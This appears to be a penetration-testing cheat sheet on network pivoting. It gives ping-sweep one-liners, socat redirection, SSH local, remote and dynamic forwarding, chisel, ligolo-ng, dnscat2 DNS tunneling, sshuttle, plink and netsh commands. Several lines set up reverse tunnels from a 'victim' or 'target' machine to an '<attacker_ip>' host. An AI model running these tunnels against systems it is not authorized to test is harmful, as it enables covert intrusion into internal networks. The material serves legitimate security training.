# 🚢 Port Redirection and Tunneling

## Ping Sweep

```shell
# Linux
nmap -v -sn x.x.x.1-253
nmap -sn x.x.x.0/24

for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
for ip in 192.168.1.{1..254}; do ping -c1 -W1 $ip &>/dev/null && echo "$ip is up"; done
fping -a -g 192.168.1.1 192.168.1.254 2>/dev/null

# Windows CMD
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "Reply"
# Windows PowerShell
1..254 | % {"172.16.6.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.6.$($_) -Quiet)"}
```

## Port Redirection

### Socat

```shell
socat TCP-LISTEN:<local_port>,fork TCP:<ip>:<port>
```

## Port Forwarding

### SSH Local Port Forwarding

```shell
# forwards local machine port 8080 to a remote machine's port 80
ssh -L 8080:localhost:80 user@ssh_server
```

### SSH Remote Port Forwarding

```shell
# forwards a remote machine's port 80 to the local machine's port 9090
ssh -R 127.0.0.1:9090:<target>:80 user@kali_machine
```

### Chisel

```shell
# create server 
chisel server --port 8080 --reverse

# create client on remote machine
chisel client <local_host>:8080 R:<local_port>:localhost:<remote_port>
```

## Tunneling

### Ligolo

> <https://github.com/nicocha30/ligolo-ng/releases>

```shell
# create ligolo interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# start the proxy on attacker machine
./li-proxy -selfcert -laddr 0.0.0.0:443

# upload the agent to the target machine and start it
./li-agent -connect <attacker_ip>:443 -ignore-cert
agent.exe -connect <attacker_ip>:443 -ignore-cert

# the connection will be displayed in the proxy
session # choose the session
ifconfig # show subnets of the agent
# add the subnet to the routing table
sudo ip route add <subnet> dev ligolo
# back in ligolo, start it
start
```

### Chisel

```shell
# create server 
chisel server --port 8080 --reverse --socks5

# create client on remote machine
chisel client <local_host>:8080 R:socks

# add the port assigned by chisel to /etc/proxychains.conf
# use proxychains to interact with the internal network 
sudo proxychains <command>

# create a client and add extra port forwarding (useful to access a web page from a browser)
./chisel client <local_host>:8080 R:socks R:4545:localhost:80
```

### SSH Dynamic Port Forwarding

```shell
# creates a dynamic tunnel between local host and target
ssh -D 9050 user@10.4.213.215

# add port to /etc/proxychains4.conf
socks5 127.0.0.1 9050

# use proxychains to interact with the internal network 
sudo proxychains <command>
```

### DNS Tunneling

```shell
dnscat2-server feline.corp

# from the victim machine
dnscat feline.corp

# from the server
windows -i <id>
? for help
```

### Sshuttle

```shell
# creates a VPN-like tunnel between networks
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## Windows Tools

### ssh.exe

```shell
# creates a dynamic reverse tunnel between the current host and the attack host
ssh -N -R 9998 kali@192.168.45.171

# configure proxychains in /etc/proxychains4.conf
socks5 127.0.0.1 9998

# use proxychains to interact with 
sudo proxychains <command> <ip>
```

### Plink

```shell
# creates an SSH tunnel from a local port to a remote service
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

### Netsh

```shell
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

# show active interfaces
netsh interface portproxy show all
```
